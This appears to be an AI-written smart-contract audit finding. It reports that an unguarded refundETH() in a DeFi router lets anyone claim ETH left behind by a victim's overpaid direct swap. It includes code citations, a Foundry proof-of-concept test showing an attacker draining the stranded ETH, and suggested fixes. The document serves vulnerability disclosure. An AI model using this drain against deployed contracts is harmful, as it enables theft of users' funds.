The vulnerability is real and fully traceable through the scoped code. Here is the complete analysis:

---

### Title
Unguarded `refundETH()` Allows Any Caller to Steal ETH Stranded by Victim's Overpaid Swap — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary

`refundETH()` is an unrestricted `external` function that transfers the router's entire native ETH balance to `msg.sender`. The `pay()` helper, when `tokenIn == WETH` and `msg.value >= amountIn`, wraps exactly `amountIn` ETH and leaves the remainder on the router with no automatic refund. Any attacker who calls `refundETH()` in a subsequent transaction claims the victim's overpaid ETH.

### Finding Description

**Step 1 — Victim overpays ETH in a direct swap call.**

`exactInputSingle` (and `exactInput`, `exactOutputSingle`, `exactOutput`) are all `external payable`. [1](#0-0) 

A user calling `exactInputSingle{value: 2 ether}(amountIn=1 ether, tokenIn=WETH)` directly (not via `multicall`) is a valid call the router accepts.

**Step 2 — `pay()` wraps only `amountIn`, leaving the excess on the router.**

Inside `pay()`, when `token == WETH` and `nativeBalance >= value`:

```solidity
uint256 nativeBalance = address(this).balance;   // 2 ether
if (nativeBalance >= value) {                     // 2 >= 1 → true
    IWETH9(WETH).deposit{value: value}();         // wraps 1 ether
    IERC20(WETH).safeTransfer(recipient, value);  // sends 1 WETH to pool
}
// 1 ether remains on the router — no refund
``` [2](#0-1) 

The swap completes successfully. The victim's transaction ends with 1 ETH stranded on the router.

**Step 3 — Attacker calls `refundETH()` in a separate transaction.**

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // sends all ETH to attacker
    }
}
``` [3](#0-2) 

There is no check that `msg.sender` is the original depositor. The attacker receives the victim's 1 ETH.

**Why the `receive()` guard does not help.**

The `receive()` function blocks direct ETH pushes from non-WETH addresses: [4](#0-3) 

But it does not block ETH sent as `msg.value` to a `payable` function. The victim's ETH enters via `exactInputSingle{value: ...}`, not via a bare ETH transfer, so `receive()` is never invoked.

**The intended safe pattern is multicall — but it is not enforced.**

The test file documents the intended usage:

```
/// @dev Native ETH flows follow Uniswap v3-periphery multicall patterns:
///      - ETH input: multicall{value}(exactInput*) with WETH as tokenIn
``` [5](#0-4) 

The safe test uses `multicall{value: 2 ether}([exactInputSingle(amountIn=1_000), refundETH()])` so the refund is atomic: [6](#0-5) 

But the protocol never enforces this. `exactInputSingle` is independently callable with any `msg.value`, and `refundETH()` has no caller restriction.

### Impact Explanation

Direct theft of user ETH principal. Any ETH overpaid in a non-multicall swap call is immediately claimable by any address. The loss equals `msg.value - amountIn` per victim transaction. No protocol permission or special role is required by the attacker.

### Likelihood Explanation

- Users and integrators commonly call swap functions directly with a buffer ETH value to handle slippage or gas estimation uncertainty.
- MEV bots routinely monitor the mempool for stranded balances on public routers.
- The attack requires a single public call with no setup.

### Recommendation

Either:
1. **Auto-refund excess ETH at the end of each payable swap function**: after the swap, if `address(this).balance > 0`, transfer it back to `msg.sender`.
2. **Restrict `refundETH()` to only be callable within a `multicall` context** (e.g., via a transient reentrancy flag set by `multicall`), so it cannot be called as a standalone cross-transaction drain.

Option 1 is simpler and eliminates the stranding entirely.

### Proof of Concept

```solidity
// Foundry test sketch
function test_attacker_steals_victim_overpaid_eth() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");
    vm.deal(victim, 2 ether);

    // Victim calls exactInputSingle directly with 2 ether but amountIn = 1 ether
    vm.prank(victim);
    router.exactInputSingle{value: 2 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 1 ether,
            amountOutMinimum: 0,
            recipient: victim,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    // 1 ether is now stranded on the router

    assertEq(address(router).balance, 1 ether, "ETH stranded");

    uint256 before = attacker.balance;
    vm.prank(attacker);
    router.refundETH();  // no access control

    assertEq(attacker.balance - before, 1 ether, "attacker stole victim ETH");
    assertEq(address(router).balance, 0, "router drained");
}
```

The `pay()` branch at lines 75–77 wraps exactly `amountIn` (1 ether) and leaves the remaining 1 ether on the router. [7](#0-6) 
`refundETH()` then sends the full balance to the attacker with no origin check. [3](#0-2)

### Citations

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-67)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L74-78)
```text
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L8-10)
```text
/// @dev Native ETH flows follow Uniswap v3-periphery multicall patterns:
///      - ETH input: multicall{value}(exactInput*) with WETH as tokenIn
///      - ETH output: swap WETH to router, then unwrapWETH9 in the same multicall
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
